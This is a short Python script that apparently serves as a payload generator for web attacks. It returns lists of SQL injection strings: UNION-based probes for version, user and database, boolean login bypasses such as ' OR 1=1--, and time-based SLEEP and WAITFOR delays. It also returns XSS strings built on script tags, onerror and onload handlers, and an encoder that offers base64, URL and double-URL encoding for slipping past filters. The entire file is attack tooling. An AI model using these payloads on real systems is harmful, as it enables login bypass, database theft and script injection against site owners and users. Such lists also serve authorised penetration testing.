#!/usr/bin/env python3
"""Generate common exploit payloads"""

import base64
import urllib.parse

class PayloadGenerator:
    
    @staticmethod
    def sql_injection(type='union'):
        """Generate SQL injection payloads"""
        if type == 'union':
            return [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
            ]
        elif type == 'boolean':
            return [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' OR 1=1--",
                "admin' --",
                "admin' #",
            ]
        elif type == 'time':
            return [
                "' OR SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
            ]
    
    @staticmethod
    def xss(type='reflected'):
        """Generate XSS payloads"""
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
        ]
        return payloads
    
    @staticmethod
    def encode(payload, method='base64'):
        """Encode payload"""
        if method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'url':
            return urllib.parse.quote(payload)
        elif method == 'double-url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        return payload

if __name__ == "__main__":
    gen = PayloadGenerator()
    
    print("SQL Injection (UNION):")
    for p in gen.sql_injection('union'):
        print(f"  {p}")
    
    print("\nXSS Payloads:")
    for p in gen.xss():
        print(f"  {p}")
